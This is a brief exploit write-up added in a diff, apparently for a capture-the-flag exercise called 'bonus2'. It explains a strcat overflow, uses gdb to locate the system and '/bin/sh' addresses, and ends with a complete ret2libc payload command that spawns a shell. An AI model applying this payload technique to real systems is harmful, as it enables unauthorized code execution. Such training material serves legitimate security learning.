@@ -1,0 +1,15 @@
+The program try to strcat our argv1 into a string that contain Hello in three different language. He also take
+a seconde arg. Strcat is a vulnerable function. We can overwrite the eip and use the ret2libc method to get a shell
+Offsets of this exploit can be different due to environement varibles lenghts.
+
+Get the adress of system:
+(gdb) p system
+b7e6b060
+
+Get the adress of "/bin/sh":
+(gdb) find 0xb7f8cc58, +999999999, "/bin/sh"
+b7f8cc58
+
+Ret2libc exploit = Top of stack + EBP + EIP (Addr of our system function) + DUMMY return addr + address of "/bin/sh" string
+
+$> ./bonus2 $(python -c 'print "A" * 14 + "\x60\xb0\xe6\xb7" + "DUMM" + "\x58\xcc\xf8\xb7" + "A" * 280') $(python -c 'print "B" * 26')
